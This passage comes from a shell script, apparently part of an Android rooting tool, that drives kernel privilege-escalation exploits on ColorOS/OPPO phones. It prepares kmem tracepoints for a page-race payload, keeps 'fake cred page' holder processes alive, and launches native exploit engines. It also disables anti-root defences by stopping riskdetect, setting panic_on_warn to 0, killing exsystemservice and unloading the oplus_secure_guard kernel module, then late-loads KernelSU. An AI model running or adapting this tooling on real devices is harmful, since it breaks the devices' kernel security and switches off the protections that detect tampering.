  ksud_late_gate
  case "$KSUD" in
    /data/app/*) printf '%s\n%s\n%s\n' "$KSUD" "$KSUD_VER" "$MGR" > "$D/.ksud_cache" 2>/dev/null ;;
    *) rm -f "$D/.ksud_cache" 2>/dev/null ;;   # 内置 ksud 不缓存，下次先找管理器的
  esac
  return 0
}

# 管理器缺失时：只有内置 KernelSU 有随包 APK 可装；其它要求用户自己装
ensure_manager() {
  # 快路径：上次已验证过同一个管理器 → 直接跳过 pm path（冷启动时 pm 要 200~400ms）
  if [ -f "$D/.mgr_ok" ] && [ "$(cat "$D/.mgr_ok" 2>/dev/null | tr -d '\r')" = "$MGR" ]; then
    echo "MGR_READY=$MGR (cache)"
    return 0
  fi
  if pm path "$MGR" 2>/dev/null | grep -q package:; then
    echo "MGR_READY=$MGR"
    echo "$MGR" > "$D/.mgr_ok" 2>/dev/null
    return 0
  fi
  _mapk="$D/manager.apk"
  [ -f "$_mapk" ] || { [ -n "$KA" ] && [ -f "$KA/manager.apk" ] && _mapk="$KA/manager.apk"; }
  if [ "$MGR" = "me.weishu.kernelsu" ] && [ -f "$_mapk" ]; then
    echo "MGR_INSTALL: 内置 KernelSU 管理器未安装，先用 shell 域安装"
    pm install -r "$_mapk" 2>&1 | tail -n 3 | sed 's/^/  | /'
    if pm path "$MGR" 2>/dev/null | grep -q package:; then
      echo "MGR_READY=$MGR (installed)"
      return 0
    fi
  fi
  echo "MGR_MISSING: $MGR（第三方/自定义管理器请先手动安装，否则无法 late-load）"
  return 1
}

# ---------------------------------------------------------------- 反 root 守卫
# ColorOS 的 com.oplus.exsystemservice / riskdetect 在检测到提权后会弹窗并在约 15 秒后
# reboot("Malicious app try to root devices")。6.12 上这就是「成功之后又重启」的主因。
# 只在「已经拿到 su」之后才轮询：拿 root 之前的每 0.2s 一次 su 失败 fork
# 会持续给系统加负载（5 进程/秒），足以打乱 payload 的纳秒级竞态。
guard_loop_bg() {
  # ★ 0.8.65：**无条件**投递（以前被 ANTIROOT gate 掉）—— 这是「成功后 ~15 秒被反 root 重启」的保命线，
  #   只 `stop riskdetect`，不改任何系统包；ANTIROOT 只控制下面的激进压制。
  setsid sh -c 'i=0; while [ $i -lt 60 ]; do
      su -c "stop riskdetect" >/dev/null 2>&1 && exit 0
      i=$((i+1)); sleep 1
    done' >/dev/null 2>&1 &
  echo "GUARD_BG: stop riskdetect 已后台投递（每 1s，最多 60 次）"
}

guard_off() {
  # ★ 0.8.65：第一段**无条件**（保命线）：只停风控服务 + 关 panic_on_warn，不碰任何系统包。
  #   历史教训：0.8.6 收敛时 6.12 就是「只 stop riskdetect」；后来 ANTIROOT 默认改成 0，
  #   这条也被一起 gate 掉 → 用户又看到「6.12 成功后自动重启」。
  echo "GUARD_STATE=$(root_do 'getprop init.svc.riskdetect' | tr -d '\r')"
  root_do "stop riskdetect; echo 0 > /proc/sys/kernel/panic_on_warn" | sed 's/^/  | /'
  echo "REBOOT_GUARD: stop riskdetect + panic_on_warn=0（规避成功后约 15 秒被反 root 重启）"
  # 第二段：激进压制（默认关；只影响 exsystemservice 进程，不 disable 任何包）
  if [ "$ANTIROOT" = "1" ]; then
    if [ "$MODE" != "612" ]; then
      # 6.6：只杀守卫进程。注意 pkill 必须单独一条，否则 -f 会匹配到执行它的 shell 自己。
      # **绝不 pm disable-user com.oplus.exsystemservice**（那个服务管截图/桌面数据，禁用会出大问题）
      root_do "pkill -9 -f 'com[.]oplus[.]exsystemservice'" | sed 's/^/  | /'
      root_do "pm enable --user 0 com.oplus.exsystemservice" 2>/dev/null | sed 's/^/  | /'
    fi
  else
    echo "GUARD_SKIP: 激进压制关闭（ANTIROOT=0），保命线已执行"
  fi
  # 可选：卸载 OPPO 的内核安全模块（默认不动；要开就建 /sdcard/kmroot-unload-guard 或设 KMROOT_UNLOAD_GUARD=1）
  if [ "${KMROOT_UNLOAD_GUARD:-0}" = "1" ] || [ -f /sdcard/kmroot-unload-guard ]; then
    echo "GUARD_UNLOAD_KERNEL: rmmod oplus_secure_guard_new"
    root_do "rmmod oplus_secure_guard_new" | sed 's/^/  | /'
    if grep -qi oplus_secure_guard /proc/modules 2>/dev/null; then
      echo "GUARD_UNLOAD_STILL_LOADED"
    else
      echo "GUARD_UNLOAD_GONE"
    fi
  fi
  echo "GUARD_ANTIROOT_OFF"
}

guard_on() {
  # ★ 0.8.65：无条件恢复（因为上面无条件停过 riskdetect）；pm enable 是幂等的，没禁用过也无害。
  # 后台延迟恢复：主流程不等这 N 秒，成功立刻显示
  setsid sh -c "sleep ${KMROOT_GUARD_HOLD:-10}; su -c 'pm enable --user 0 com.oplus.exsystemservice' >/dev/null 2>&1; su -c 'pm enable --user 0 com.oplus.screenshot' >/dev/null 2>&1; su -c 'start riskdetect' >/dev/null 2>&1; su -c 'setprop ctl.start riskdetect' >/dev/null 2>&1" >/dev/null 2>&1 &
  echo "GUARD_RESTORE_BG: 已后台排队，${KMROOT_GUARD_HOLD:-10}s 后恢复 exsystemservice/screenshot"
}

# ---------------------------------------------------------------- 管理器收尾
start_manager() {
  # 关键：**不要 am force-stop**。ksud late-load 成功时常常已经把管理器拉起来了，
  # 我们再 force-stop 就等于把它关掉；随后 am start 在 ColorOS 上又常被 classifyResrict 静默拦掉
  # → 表现就是"模块加载了，但管理器没起来"（客户机上遇到的就是这个）。
  if pidof "$MGR" >/dev/null 2>&1; then
    echo "MGR_START=already-running"
    return 0
  fi
  _act=""
  _i=1
  while [ $_i -le 3 ]; do
    _act=$(cmd package resolve-activity --brief -a android.intent.action.MAIN \
           -c android.intent.category.LAUNCHER "$MGR" 2>/dev/null | tail -n 1)
    case "$_act" in
      */*) am start -n "$_act" >/dev/null 2>&1 ;;
    esac
    sleep 1
    if pidof "$MGR" >/dev/null 2>&1; then
      echo "MGR_START=am:$_act try=$_i"
      return 0
    fi
    # ColorOS 上 monkey 是唯一稳定的启动方式，重试 3 次（实测常要 3~4 次）
    monkey -p "$MGR" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
    sleep 1
    if pidof "$MGR" >/dev/null 2>&1; then
      echo "MGR_START=monkey try=$_i"
      return 0
    fi
    # 最后一招：按包名 + MAIN/LAUNCHER 拉起（等价于桌面点图标）
    am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -p "$MGR" >/dev/null 2>&1
    sleep 1
    if pidof "$MGR" >/dev/null 2>&1; then
      echo "MGR_START=am-pkg try=$_i"
      return 0
    fi
    _i=$((_i+1))
  done
  echo "MGR_START_FAIL: $MGR 没起来（桌面手动点开即可；root/KSU 不受影响）"
  return 1
}

crown_manager() {
  # KuaiMaoSU / FinaSU 需要显式把内核 dynamic-manager 指向自己，
  # 否则上一次的 Baka/其它管理器仍占着「当前管理器」，界面显示成它。
  case "$MGR" in
    com.kuaimaosu.manager|me.yuki.fina) ;;
    *) return 0 ;;
  esac
  _apk=$(pm path "$MGR" 2>/dev/null | head -n 1 | sed 's/^package://' | tr -d '\r')
  if [ -z "$_apk" ] || [ -z "$KSUD" ]; then return 0; fi
  echo "CROWN_MGR: 把动态管理器指向 $MGR（$_apk）"
  # 新命令优先（与管理器 App 内 KsuCli.setDynamicManagerApk 一致），失败退旧命令
  _out=$(root_do "$KSUD kernel dynamic-manager set-apk '$_apk'")
  echo "$_out" | sed 's/^/  | /'
  case "$_out" in
    *mpath*|*ommand*|*nknown*|*rror*|NO_ROOT*)
      echo "CROWN_MGR_FALLBACK: 试旧命令 dynamic set-apk"
      root_do "$KSUD dynamic set-apk '$_apk'" | sed 's/^/  | /'
      ;;
  esac
}

# ksud install：**判据必须是"成品可执行文件在不在"，不是目录在不在**。
# ★ 0.8.47：以前只要 `/data/adb/ksu` 目录存在就跳过 install。可目录可能是**半成品**
#   （上次 install 中途失败/被清理），此时 `bin/su` 根本没生成 → su 永远起不来，
#   表现正好是「模块已加载但 su 不可用 —— su 可执行文件不在」（2026-10-31 PLR110 真机）。
#   仍保留"已就绪就不重复 install"的初衷（重复 install 在已 late-load 的 KSU 上有触发
#   soft-reboot 的嫌疑），但把判据从目录换成 bin/su。
ksud_install_once() {
  [ -n "$KSUD" ] || return 0
  # ★ 0.8.48：跳过条件改成"su 真的能用"（而不是拿某个路径的 [-x] 当判据）。
  #   `/data/adb/ksu/bin` 常是 0700 root，shell 域连 stat 都被拒 —— 用 [-x] 会**误判成缺失**
  #   于是每轮都重跑 install（反而有 soft-reboot 风险）。
  if su_ok; then
    echo "KSUD_INSTALL_SKIP: su 已可用"
    return 0
  fi
  if [ -d /data/adb/ksu ]; then
    echo "KSUD_INSTALL_REDO: /data/adb/ksu 存在但 su 不可用（半成品/被清理）→ 重新 install"
  fi
  root_do "$KSUD install" | sed 's/^/  | /'
  if su_ok; then
    echo "KSUD_INSTALL_OK"
  else
    echo "KSUD_INSTALL_FAIL: install 之后 su 仍不可用 —— 这一轮拿不到 root"
    su_probe
  fi
}

# ksud late-load：--kmi 优先，逐级退化，最后看 /proc/modules 定论
late_load() {
  [ -n "$KSUD" ] || { echo "LATE_LOAD_SKIP: 没有可用 ksud（先安装所选管理器）"; return 1; }
  echo "LATE_LOAD: $KSUD src=$KSUD_SRC ver=$KSUD_VER kmi=${KMI:-none} pkg=$MGR"
  ksud_install_once
  if [ -n "$KMI" ]; then
    root_do "$KSUD late-load --kmi $KMI --allow-shell --package-name $MGR" | sed 's/^/  | /'
    sleep 1
    have_mod && return 0
    echo "LATE_LOAD_RETRY: 不带 --kmi"
  fi
  root_do "$KSUD late-load --allow-shell --package-name $MGR" | sed 's/^/  | /'
  sleep 1
  have_mod && return 0
  echo "LATE_LOAD_RETRY: 最简形式"
  root_do "$KSUD late-load" | sed 's/^/  | /'
  sleep 1
  have_mod
}

peek_parked() {
  if [ -f "$D/parked" ] && [ -n "$BOOTID" ] && [ "$(cat "$D/parked" 2>/dev/null)" = "$BOOTID" ] && plant_alive; then
    return 0
  fi
  if [ -f "$D/km612.hold" ] && e612_alive; then
    return 0
  fi
  if is_held; then
    return 0
  fi
  # 日志每轮开跑时会被 mv 成 kmfast.prev.log，所以"持页"证据要两份都查
  if fast_alive && { grep -q "fake cred page held" kmfast.log 2>/dev/null \
                     || grep -q "fake cred page held" kmfast.prev.log 2>/dev/null; }; then
    return 0
  fi
  return 1
}

cleanup_rootd() {
  if peek_parked; then
    if have_mod; then
      echo "SAFE_KEEP: 已成功，持页进程保留（它是 root 现场的宿主，别 kill；重启即清）"
    else
      echo "SAFE_MISS_PRESENT: 有持页进程（parked/held），保留现场，重启后再试"
    fi
    return 0
  fi
  if e612_alive; then
    if [ "${KMROOT_KILL_ROOTD:-0}" = "1" ]; then
      # -x 只匹配短进程名（copy 模式）；ND 模式的进程名是 libkm612.so，必须再用 -f 兜一遍，
      # 否则这里会一边打 "CLEANED" 一边什么都没杀到（谎报）。
      root_q "pkill -9 -x km612" 2>/dev/null
      root_q "pkill -9 -f libkm612.so" 2>/dev/null
      echo "T61269_CLEANED"
      rm -f /data/local/tmp/km6120-root.sock 2>/dev/null
      root_q "rm -f /data/local/tmp/km6120-root.sock"
    else
      echo "T61269_KEPT: 保留 rootd（收尾时释放它的页面有 panic 风险；重启即清）"
    fi
  fi
  if plant_alive; then
    root_q "pkill -9 -x kmplant" 2>/dev/null
    root_q "pkill -9 -f libkmplant.so" 2>/dev/null
    echo "TRPLANT_CLEANED"
  fi
  if fast_alive; then
    if grep -q "fake cred page held" kmfast.log 2>/dev/null \
       || grep -q "fake cred page held" kmfast.prev.log 2>/dev/null; then
      echo "SAFE_KEEP: kmfast 仍持页，保留进程（重启即清）"
    else
      root_q "pkill -9 -x kmfast" 2>/dev/null
      root_q "pkill -9 -f libkmfast.so" 2>/dev/null
      echo "TRFAST_CLEANED"
    fi
  fi
  rm -f /data/local/tmp/km9826-root.sock 2>/dev/null
  root_q "rm -f /data/local/tmp/km9826-root.sock"
  rm -f "$D/km612.hold" "$D/held" "$D/held.alt" 2>/dev/null
}

# 模块已加载时的收尾（二次打开 / 上一轮就已经接管）
finish_loaded() {
  echo "[5/5] verify existing KernelSU"
  ensure_manager || true
  if su_ok; then
    echo "SU_OK: $(timeout 10 su -c 'id' 2>/dev/null | head -n 1)"
  tlog SU
  dump_pstore
    ksud_install_once
    crown_manager
    cleanup_rootd
    guard_off
    guard_on
    self_heal_guard
    camera_hal_reset
    mute_sec_popup_bg
    # 不主动拉起管理器：KuaiMaoSU 自身就在前台运行，提权成功后由界面自动弹回主页并刷新状态。
    echo "RESULT=ALREADY"
  else
    echo "SU_NOT_READY: 模块已加载但 su 不可用"
    # ★ 0.8.43：su 不可用有四种成因，结论完全不同，必须给出**可复核**的判定，
    #   不能一句"重启再试"糊过去（2026-10-31 PLJ110 现场就是这种：模块 Live、管理器 3.2.5、
    #   su 不可用，但日志里看不出是"su 文件没装"还是"KSU 拒绝授权"还是"版本不一致"）。
    _su1=$(timeout 8 su -c 'id -u' 2>&1 | head -n 2 | tr '\n' ' ' | tr -d '\r')
    echo "SU_TRY1: su → ${_su1:-<空>}"
    # ★ 0.8.48：先取一次证 —— 「su 到底在不在」不能靠单个路径的 [-x]（/data/adb/ksu/bin
    #   常是 0700 root，shell stat 会被拒）。su_probe 会打 which/候选路径/ls -ld，一次看清。
    su_probe
    if [ -x /data/adb/ksu/bin/su ]; then
      _su2=$(timeout 8 /data/adb/ksu/bin/su -c 'id -u' 2>&1 | head -n 2 | tr '\n' ' ' | tr -d '\r')
      echo "SU_TRY2: /data/adb/ksu/bin/su → ${_su2:-<空>}"
    else
      echo "SU_MISSING: /data/adb/ksu/bin/su 不存在（或无权 stat）"
      if [ -d /data/adb/ksu ]; then
        echo "SU_STATE: /data/adb/ksu 目录在、但 bin/su 缺失（install 半成品/被清理）"
      else
        echo "SU_STATE: /data/adb/ksu 整个不存在（从没做过 ksud install，或无权 stat）"
      fi
      _su2="no such file"
    fi
    echo "MOD_LINE: $(mod_line)"
    echo "KSUD_NOW: ${KSUD:-none} src=${KSUD_SRC:-none} ver=${KSUD_VER:-none}"
    _why_all="$_su1 $_su2"
    case "$_why_all" in
      *"not found"*|*"No such file"*|*"no such file"*)
        echo "NOSU_WHY: su 可执行文件不在（ksud install 没做过/半成品/被清理）→ 先看上面 SU_PROBE：若 /data/adb/ksu/bin 里确实没有 su，这一轮没 root 修不了，冷重启后重跑；若那里有 su 却仍不可用，把 SU_PROBE 整段发我（说明是权限或版本问题，不是缺文件）" ;;
      *enied*|*"deny"*|*"not allowed"*)
        echo "NOSU_WHY: 内核模块在，但 KSU 拒绝了这次 root 请求（多半是已加载的 LKM 与管理器/ksud 版本不一致，或管理器没给调用者授权）→ 冷重启手机后重跑；再到管理器里确认已给 KMRoot 授权" ;;
      *"uid=0"*|"0 ")
        echo "NOSU_WHY: su 其实能拿到 uid=0，是判定时序问题（模块刚起来还没就绪）→ 重新点一次即可" ;;
      *)
        echo "NOSU_WHY: 模块在但不响应 su（版本不一致或模块残缺）→ 冷重启手机后重跑；若重复出现把这段日志发出来" ;;
    esac
    echo "RESULT=NOSU"
  fi
}

# ---------------------------------------------------------------- 模式 A：6.6 快速
# 从内置档案（prof_*.txt，参考引擎 的那 17 份）里按 release= 精确匹配
pick_profile() {
  if [ -f "$D/.prof_cache" ]; then
    read -r _pr _pp < "$D/.prof_cache" 2>/dev/null
    if [ "$_pr" = "$SR" ] && [ -n "$_pp" ] && [ -f "$_pp" ]; then echo "$_pp"; return 0; fi
  fi
  _hit=$(grep -lF "release=$SR" "$D"/prof_*.txt 2>/dev/null | head -n 1)
  if [ -z "$_hit" ] && [ -n "$ND" ]; then
    _hit=$(grep -lF "release=$SR" "$ND"/libtrprof_*.so 2>/dev/null | head -n 1)
  fi
  # ★ 精确串没中时退一步：按 AB build id 匹配。
  #   git hash 会随厂商构建方式变（例如 g242e1a07f878 与 g242c1a07878，
  #   同一个 ab15865446-4k 内核，短 hash 却不一样），但 ab 号跟着内核二进制走。
  if [ -z "$_hit" ]; then
    _ab=$(printf '%s' "$SR" | sed -n 's/.*\(ab[0-9]\{5,\}-[0-9]\{1,2\}k\).*/\1/p')
    if [ -n "$_ab" ]; then
      _hit=$(grep -lF -- "-$_ab" "$D"/prof_*.txt 2>/dev/null | head -n 1)
      if [ -n "$_hit" ]; then
        echo "PROFILE_FUZZY: 精确串没中，按 AB=$_ab 命中 $(basename "$_hit")（git hash 与档案不同，同一 AB 构建）"
      fi
    fi
  fi
  # ★ 0.9.4：放宽 —— 没有精确档案时，用**同版本系列**的档案试跑。
  #   用户明确要求「识别到 6.6/6.12/6.1.157 就跑」：宁可试一次，也不要被门禁直接拦住。
  #   风险说明：plant 是按档案里的 call_site 去找页的，对不上通常是「找不到记录 → miss」，
  #   而不是随便乱写；但确实存在「恰好匹配到别的页」的小概率。
  #   想要旧行为（没精确档案就不跑）：touch /sdcard/kmroot-strict
  if [ -z "$_hit" ] && [ ! -f /sdcard/kmroot-strict ]; then
    _ver=$(printf '%s' "$SR" | sed -n 's/^\([0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\).*/\1/p')
    if [ -n "$_ver" ]; then
      _hit=$(grep -l "release=${_ver}-" "$D"/prof_*.txt 2>/dev/null | head -n 1)
      if [ -z "$_hit" ]; then
        _mm=$(printf '%s' "$_ver" | cut -d. -f1,2)
        _hit=$(grep -l "release=${_mm}\." "$D"/prof_*.txt 2>/dev/null | head -n 1)
      fi
      if [ -n "$_hit" ]; then
        echo "PROFILE_RELAXED: 没有 $SR 的精确档案 → 借用 $(basename "$_hit") 试跑（同版本系列，失败属正常）"
      fi
    fi
  fi
  [ -n "$_hit" ] || return 1
  printf '%s %s\n' "$SR" "$_hit" > "$D/.prof_cache" 2>/dev/null
  echo "$_hit"
  return 0
}

FAST_BUDGET=${KMROOT_FAST_BUDGET:-240}
# 轮询次数：每轮 sleep 0.3s，所以「预算秒数」要 ×10/3 才是次数。
# 以前写成 BUDGET*3（=216s），引擎在最后 10% 才成功时脚本已经放弃 → 报 FASTFAIL 把用户推去重启。
iter_for() { echo $(( $1 * 10 / 3 + 1 )); }

# ---------------------------------------------------------------- tracefs 准备（6.6 与 6.12 都要）
# ★ 两个引擎用的是**同一套** kmem 事件（`EnableEvent` 那三行在 libkmfast.so 和 libkm612.so 里都有，
#   连报错文案 "page event ids not found (records=%zu pairs=%d)" 都一模一样）。
#   0.8.9 只给 6.6 路径加了这段准备，6.12 路径一直没加 —— 于是 ROM 默认 tracing_on=0 / 事件关着时，
#   6.12 引擎照样认不出记录，失败还会被误报成「parked / no-rootd」。
# 统计：几个事件是开的（读到 1）、几个是**读得到**的。
# 「读不到」和「读到 0」必须分开，不能把没权限读误判成没开。
trace_enabled_stat() {
  _on=0; _known=0
  for _ev in mm_page_alloc mm_page_free kmem_cache_alloc; do
    _v=$(cat "$_tr/events/kmem/$_ev/enable" 2>/dev/null | tr -d '\r')
    [ -n "$_v" ] && _known=$((_known+1))
    [ "$_v" = "1" ] && _on=$((_on+1))
  done
}
trace_enabled_count() { trace_enabled_stat; echo $_on; }

# ---------------------------------------------------------------- 系统设置 / 关键包自检（0.8.64）
# 用户反馈「root 成功后有系统应用被降级、Play 商店不见了、自动旋转被打开」。
# 审计结论：本脚本里**没有任何** pm/settings 命令会动那些包（只有 exsystemservice 的
#   enable / install-existing，且只碰白名单两个包），也**没有** settings put —— 但现象与
#   "系统更新被回滚 / 设置被重置"一致（例如多次内核 panic 后 ColorOS 的修复流程），
#   所以这里加一层可复核的自检，并把被改的旋屏设置自动恢复：
#   ① 开跑前快照 accelerometer_rotation / user_rotation 到 $D/.syssnap；
#   ② 收尾对比，被改了就用 root 或 shell 恢复回原值；
#   ③ 体检几个关键系统应用：被"对用户卸载"的用 install-existing 修回来，版本变化只报告。
WATCH_PKGS="com.android.vending com.heytap.browser com.heytap.market com.heytap.cloud"

# 6.12 引擎选择的状态（0.8.71）：**不能**放 $D —— App 每次升级/重建工作目录会把 $D 换掉，
# 标记就丢了（PMW110 2026-11-05 现场：上一轮写了 ARMED，下一轮读不到又走了新引擎）。
# 放 /sdcard 下一个固定目录，跨升级、跨重启都稳；不可写时再退回 $D。
STATEDIR=/sdcard/.kmroot_state
[ -d "$STATEDIR" ] 2>/dev/null || mkdir -p "$STATEDIR" 2>/dev/null
[ -d "$STATEDIR" ] 2>/dev/null || STATEDIR="$D"
ENG_HINT="$STATEDIR/engine612.hint"
ENG_BAD="$STATEDIR/engine612.bad"
# 诊断块的版本：内容升级后，diag.done 里的旧版本号不匹配 → 自动再抓一次
DIAG_VER=4

sys_snapshot() {
  _a=$(settings get system accelerometer_rotation 2>/dev/null | tr -d '\r')
  _u=$(settings get system user_rotation 2>/dev/null | tr -d '\r')
  printf '%s %s\n' "${_a:-?}" "${_u:-?}" > "$D/.syssnap" 2>/dev/null
  echo "SYS_SNAP: accelerometer_rotation=${_a:-?} user_rotation=${_u:-?}"
}

sys_selfcheck() {
  [ -f "$D/.syssnap" ] || return 0
  read -r _a0 _u0 < "$D/.syssnap" 2>/dev/null
  _a=$(settings get system accelerometer_rotation 2>/dev/null | tr -d '\r')
  _u=$(settings get system user_rotation 2>/dev/null | tr -d '\r')
  if [ -n "$_a0" ] && [ "$_a0" != "?" ] && [ "$_a" != "$_a0" ]; then
    root_q "settings put system accelerometer_rotation $_a0" 2>/dev/null
    [ "$(settings get system accelerometer_rotation 2>/dev/null | tr -d '\r')" = "$_a0" ] || \
      settings put system accelerometer_rotation "$_a0" 2>/dev/null
    echo "SYS_RESTORE: accelerometer_rotation $_a -> $_a0"
  fi
  if [ -n "$_u0" ] && [ "$_u0" != "?" ] && [ "$_u" != "$_u0" ]; then
    root_q "settings put system user_rotation $_u0" 2>/dev/null
    [ "$(settings get system user_rotation 2>/dev/null | tr -d '\r')" = "$_u0" ] || \
      settings put system user_rotation "$_u0" 2>/dev/null
    echo "SYS_RESTORE: user_rotation $_u -> $_u0"
  fi
  for _wp in $WATCH_PKGS; do
    if pm list packages 2>/dev/null | grep -qx "package:$_wp"; then
      _v=$(dumpsys package "$_wp" 2>/dev/null | grep -m1 'versionName=' | sed 's/.*versionName=//')
      echo "SYS_PKG: $_wp version=${_v:-?}"
    elif pm list packages -u 2>/dev/null | grep -qx "package:$_wp"; then
      echo "SYS_PKG_UNINSTALLED: $_wp 被对用户卸载 → 尝试 install-existing 恢复"
      pm install-existing --user 0 "$_wp" 2>/dev/null | sed 's/^/  | /'
      root_q "pm install-existing --user 0 $_wp" 2>/dev/null | sed 's/^/  | /'
    else
      echo "SYS_PKG_MISSING: $_wp 完全不存在"
    fi
  done
}

prep_trace() {
  TRACE_BLOCKED=0
  _tr=/sys/kernel/tracing
  [ -d "$_tr/events" ] || _tr=/sys/kernel/debug/tracing
  # ★ 0.8.51 取证一：**这三个 tracepoint 在不在**。
  #   「事件被 ROM 关着」和「内核根本没编这几个 tracepoint（或被 susfs guard 隐藏）」是两码事：
  #   前者还能想办法开，后者重试一万次也没用。以前两种都只报一句"ROM 限制"，分不清。
  _dirs=0
  for _ev in mm_page_alloc mm_page_free kmem_cache_alloc; do
    [ -d "$_tr/events/kmem/$_ev" ] && _dirs=$((_dirs+1))
  done
  echo "TRACE_EVENTS: dirs=$_dirs/3 (path=$_tr)"
  # ★ 0.8.51 取证二：tracing_on 到底写不写得进去。
  #   写不进去时事件即使开起来也不会产生记录 → 引擎照样报 page event ids not found，
  #   而我们会误以为是"事件权限"问题。这里把写入结果和读回值都打出来。
  { echo 1; } > "$_tr/tracing_on" 2>/dev/null
  _tonw=$?
  echo "TRACE_TRACING_ON: write=$([ "$_tonw" = "0" ] && echo ok || echo DENIED) value=$(cat "$_tr/tracing_on" 2>/dev/null || echo ?)"
  # ★ 快路径（0.8.18，为对齐 参考引擎 的"零准备"体感）：三个事件已经开着就直接返回 ——
  #   常态下只花三次 cat（约几十毫秒），只有真的关着才走下面三条路线。
  trace_enabled_stat
  if [ "$_on" -eq 3 ]; then
    echo "TRACE_PREP tracing_on=$(cat "$_tr/tracing_on" 2>/dev/null || echo ?) enabled=3/3 (already on, skip)"
    return 0
  fi
  # ★ 0.9.2：上一轮引擎自己把事件开起来了（日志里有 [ids] page_alloc=），
  #   就说明这台 ROM 的 enable 文件对 shell 不可读、但引擎的 enable_event 通道可用。
  #   这种情况下四条 route 注定全失败，只是白花时间 + 刷一堆 Permission denied，
  #   直接跳过，只保证 tracing_on=1 即可。
  if [ -f "$D/.engine_selfenable" ]; then
    { echo 1; } > "$_tr/tracing_on" 2>/dev/null
    echo "TRACE_SKIP_ROUTES: 上次已验证引擎能自己开 kmem 事件（跳过 A~D 四条路线，只置 tracing_on=1）"
    TRACE_BLOCKED=0
    return 0
  fi

  _tg="$_tr/events/kmem/rss_stat/trigger"
  _on=0

  # ---- 路线 A：set_event（内核逐行解析，允许多行/多次追加）—— 最标准的一条 ----
  if [ -w "$_tr/set_event" ]; then
    for _ev in mm_page_alloc mm_page_free kmem_cache_alloc; do
      printf 'kmem:%s\n' "$_ev" >> "$_tr/set_event" 2>/dev/null
    done
    _on=$(trace_enabled_count)
    echo "TRACE_ROUTE_A set_event=writable enabled=$_on/3"
  else
    echo "TRACE_ROUTE_A set_event=denied"
  fi

  # ---- 路线 B：rss_stat/trigger 的 enable_event: ----
  # ★★ 一次 write 只能带**一条** trigger 命令！以前把三条用 \n 拼成一次写入，内核解析器会把
  #   后两行当成第一条命令的一部分 → EINVAL。实测 PLE110（0.7.0）：
  #       TRACE_TRIGGER_RC=1 / TRACE_PREP tracing_on=1 trigger=# Available triggers:
  #     → 三个事件一个都没开 → 引擎 `page event ids not found (records=12288 pairs=283)`
  #     → 被误判成"这台机不支持快速引擎"。必须逐条单独写。
  if [ "$_on" -lt 3 ] && [ -w "$_tg" ]; then
    # ★ 0.9.1：先把 rss_stat 自己打开 —— trigger 挂在一个没启用的事件上不会触发，
    #   后面那些 enable_event: 命令就一条都不会执行（同样是 rc=0 但 enabled 不变）。
    #   Shark v2.1 enable_events() 的顺序就是：先 rss_stat/enable=1，再逐条写 trigger。
    { echo 1; } > "$_tr/events/kmem/rss_stat/enable" 2>/dev/null
    echo "TRACE_RSS_ENABLE: rc=$? now=$(cat "$_tr/events/kmem/rss_stat/enable" 2>/dev/null)"
    _trc=""
    for _ev in mm_page_alloc mm_page_free kmem_cache_alloc; do
      # ★ 0.9.1：**必须带结尾换行**。ftrace 的 trigger 是按行解析的，少了 \n 时
      #   内核会把这半行挂在缓冲区里不执行 —— 表现就是 write rc=0 但 enabled 仍是 0/3。
      #   Shark v2.1 的 plant_core.inc 里就是带 \n 写的（wr(..., "enable_event:kmem:X\n")）。
      printf 'enable_event:kmem:%s\n' "$_ev" > "$_tg" 2>/dev/null
      _trc="$_trc $_ev=$?"
    done
    _on=$(trace_enabled_count)
    echo "TRACE_ROUTE_B trigger rc:$_trc → enabled=$_on/3"
    echo "TRACE_TRIGGER_NOW: $(cat "$_tg" 2>/dev/null | tr '\n' '|' | head -c 160)"
  fi

  # ---- 路线 C：直接写 enable（收紧的 ROM 多半会拒，尽力而为）----
  if [ "$_on" -lt 3 ]; then
    for _ev in mm_page_alloc mm_page_free kmem_cache_alloc; do
      { echo 1; } > "$_tr/events/kmem/$_ev/enable" 2>/dev/null
    done
    _on=$(trace_enabled_count)
    echo "TRACE_ROUTE_C direct_enable → enabled=$_on/3"
  fi

  # ---- 路线 D：子系统级 enable（events/kmem/enable）----
  # ★ 0.8.46：per-event 的 enable 文件常被 SELinux 标成 debugfs_tracing（只给 root），
  #   但**子系统级** events/kmem/enable 有时是 debugfs_tracing_debug（shell 可写）——
  #   这是三条老路线之外最便宜的一条。PLZ110/PLJ110 上前面全 denied，值得再试这一次。
  if [ "$_on" -lt 3 ]; then
    for _sub in "$_tr/events/kmem/enable" "$_tr/events/kmem/rss_stat/enable"; do
      { echo 1; } > "$_sub" 2>/dev/null
    done
    _on=$(trace_enabled_count)
    echo "TRACE_ROUTE_D subsystem_enable → enabled=$_on/3"
  fi

  trace_enabled_stat
  echo "TRACE_PREP tracing_on=$(cat "$_tr/tracing_on" 2>/dev/null || echo ?) enabled=$_on/3 readable=$_known/3"
  if [ "$_on" -lt 3 ]; then
    TRACE_BLOCKED=1
    # 顺手把"到底能不能读"标出来：readable=0 说明连 stat 都被拒（SELinux 标 debugfs_tracing），
    # readable>0 而 enabled=0 说明能读不能写 —— 两种限制的后续处理不一样。
    echo "TRACE_BLOCKED: 四条路线都试过，只开起来 $_on/3 个 kmem 事件（能读到 $_known/3，事件目录 $_dirs/3，tracing_on 写入 $([ "$_tonw" = 0 ] && echo ok || echo denied)）"
    if [ "$_dirs" = "0" ]; then
      echo "TRACE_BLOCK_KIND: 内核里**没有** mm_page_alloc/mm_page_free/kmem_cache_alloc 这三个 tracepoint（被裁剪或被 guard 隐藏）→ 快速链路在这台机上无解，只能换慢链/等适配"
    elif [ "$_tonw" != "0" ]; then
      echo "TRACE_BLOCK_KIND: 事件目录在，但 tracing_on 写不进去 → 事件即使开起来也不会产生记录（引擎必然报 page event ids not found）"
    elif [ "$_known" = "0" ]; then
      echo "TRACE_BLOCK_KIND: 事件目录在、tracing_on 正常，但 enable 文件连读都不行（SELinux 仅 root）"
    echo "  → 脚本侧读不到状态；引擎自己有 enable_event 通道，是否真被拦以引擎的 [ids] 为准"
    else
      echo "TRACE_BLOCK_KIND: 能读到 $_known/3 但写不进（能读不能写）→ 同一类 ROM 限制"
    fi
  fi
}
run_fast66() {
  # chmod 必须在 -x 判断**之前**：执行位真丢了的时候，这两行才是唯一的自修机会
  # （以前写在 -x 后面，永远执行不到，只会报 missing-payload→return 12）。
  [ -n "$ND" ] || chmod 755 kmfast 2>/dev/null
